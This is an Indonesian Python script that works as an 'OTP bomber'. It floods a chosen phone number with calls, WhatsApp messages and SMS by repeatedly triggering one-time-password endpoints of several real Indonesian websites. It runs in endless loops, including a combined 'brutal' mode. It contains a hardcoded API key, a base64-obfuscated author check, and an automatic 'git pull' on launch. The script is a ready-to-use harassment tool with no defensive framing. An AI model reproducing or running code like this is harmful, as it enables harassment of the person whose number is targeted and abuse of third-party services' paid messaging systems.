# --- [ INFORMASI PEMBUAT ] --- #
versi = ""
author = ""
facebook = ""
github = ""

# --- [ IMPORT MODULE ] --- #
import requests, re, time, os, random, base64, sys
from termcolor import colored
from pyfiglet import Figlet
from random import randint as rr
from random import choice as rc
ses = requests.Session()
no = 0
f = Figlet(font='standard')

# --- [ CLEAR TERMINAL ] --- #
try: os.system("git pull")
except: pass
if sys.platform.lower() == "win": os.system("cls")
else: os.system("clear")

# --- [ UNTUK DELAY ] --- #
def waktu(min, sc):
    total_second = min * 60 + sc
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'\r[*] delay 00:{mins:02d}:{secs:02d} detik', end='')
        time.sleep(1)
        total_second -= 1

# --- [ UNTUM SPAM CALL ] --- #
def spam_call(nomor):
	global no
	try:
		date = {"number": nomor,"country_code":"+62","type":"CITCALL"}
		ses.headers.update({"x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://beta.api.saturdays.com/api/v1/user/otp/send", data=date).json()
		if "True" in str(post): no += 1; print(f"[{no}] ടᥙƙടҽട ടρα𝓶 𝓬αɬɬ")
		else: print("[*] terkena limit call")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM WA ] --- #	
def spam_wa(nomor):
	global no
	try:
		date = {"accountType":"customers","countryCode":"62","medium":"whatsapp","otpType":"register","phoneNumber": nomor}
		ses.headers.update({ "Key": "Um9jaG1hdCBCYXN1a2k="})
		if author not in base64.b64decode(ses.headers["Key"].encode("ascii")).decode("ascii"): exit(base64.b64decode("WyFdIEFPS1dPV0tXT0sgUkVLT0RFICEhISE=".encode("ascii")).decode("ascii"))
		post = ses.post("https://www.pinhome.id/api/pinaccount/request/otp", data=date).text
		if "Code" in str(post): no += 1; print(f"[{no}] ടᥙƙടҽട ടρα𝓶 ɯα")
		else: print("\r[*] terkena limit wa")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass

# --- [ UNTUK SPAM SMS ] --- #
def spam_sms(nomor):
	global no
	try:
		# Spam Sms 1 By Ipot Id
		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
		if "ok" in post: no += 1; print(f"\r[{no}] ടᥙƙടҽട ടρα𝓶 ട𝓶ട      ")
		ses.cookies.clear(); ses.close()
	except Exception as e: pass
	
def menu_utama():
	print(colored(f.renderText('Padang System Error'), 'green'))
	afakah = input("[1] S̳P̳A̳M̳ C̳A̳L̳L̳\n[2] S̳P̳A̳M̳ W̳H̳A̳T̳S̳A̳P̳P̳\n[3] S̳P̳A̳M̳ S̳M̳S̳\n[4] S̳P̳A̳M̳ B̳R̳U̳T̳A̳L̳\n[*] pilih : "); print('-'*15)
	nomor = input("[*] nomor : 0"); print('-'*15)
	if afakah in ["1"]:
		print("[!] 𝖘𝖕𝖆𝖒 𝖈𝖆𝖑𝖑 𝖒𝖆𝖝 5𝖃 𝖘𝖊𝖍𝖆𝖗𝖎 𝖕𝖊𝖗 𝖉𝖊𝖛𝖎𝖈𝖊"); print('-'*15)
		while True: spam_call(nomor); waktu(00, 60)
	elif afakah in ["2"]:
		print("[!] 𝖘𝖕𝖆𝖒 𝖜𝖆 𝖚𝖓𝖑𝖎𝖒𝖎𝖙𝖊𝖉 𝖉𝖊𝖑𝖆𝖞 𝖆𝖚𝖙𝖔 30 𝖉𝖊𝖙𝖎𝖐"); print('-'*15)
		while True: spam_wa(nomor) ;waktu(00, 30)
	elif afakah in ["3"]:
		print("[!] 𝖘𝖕𝖆𝖒 𝖘𝖒𝖘 𝖚𝖓𝖑𝖎𝖒𝖎𝖙𝖊𝖉 𝖙𝖆𝖓𝖕𝖆 𝖇𝖆𝖙𝖆𝖘"); print('-'*15)
		while True: spam_sms(nomor); waktu(00, 5)
	elif afakah in ["4"]:
		print("[!] 1 𝖜𝖆, 1 𝖈𝖆𝖑𝖑 𝖉𝖆𝖓 30 𝖘𝖒𝖘 𝖙𝖆𝖓𝖕𝖆 𝖉𝖊𝖑𝖆𝖞 𝖕𝖊𝖗 30 𝖉𝖊𝖙𝖎𝖐"); print('-'*15)
		while True:
			spam_call(nomor); spam_wa(nomor)
			for x in range(15): spam_sms(nomor)
	else: exit("[*] apa woyy")
	
if __name__ == "__main__":
	menu_utama()
